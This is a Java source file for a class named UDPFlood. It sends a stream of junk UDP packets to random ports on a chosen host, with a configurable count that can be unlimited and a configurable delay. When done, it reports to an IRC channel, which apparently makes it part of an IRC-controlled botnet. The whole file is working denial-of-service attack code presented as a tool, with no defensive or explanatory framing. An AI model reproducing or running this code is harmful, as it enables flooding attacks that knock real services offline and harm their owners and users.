import java.net.*;
/**
 * UDPFlood class
 * @author Nathan
 *
 */
public class UDPFlood extends Thread
{
	/**
	 * Sets the hots, connections and delay
	 * @param host
	 * @param connections
	 * @param delay
	 */
    public UDPFlood(String host, int connections, int delay)
    {
        count = 0;
        this.host = host;
        this.connections = connections;
        this.delay = delay;
    }
    /**
     * Starts UDP flooding on a new thread
     */
    @SuppressWarnings("deprecation")
	public void run()
    {
        while(udpFlooding && (count < connections || connections == 0)) 
        {
            try
            {
                byte buffer[] = new byte[1024];
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, InetAddress.getByName(host), Misc.randomNumber(65535));
                DatagramSocket socket = new DatagramSocket();
                socket.send(packet);
                count++;
                if(delay > 0)
                    sleep(delay);
            } catch (Exception e) {
            	
            }
        }
		IRC.sendMessage(Config.getChannel(), "Flooding finished!");
		stop();
    }

    private String host;
    private int connections;
    private int delay;
    public static boolean udpFlooding = false;
    private int count;

}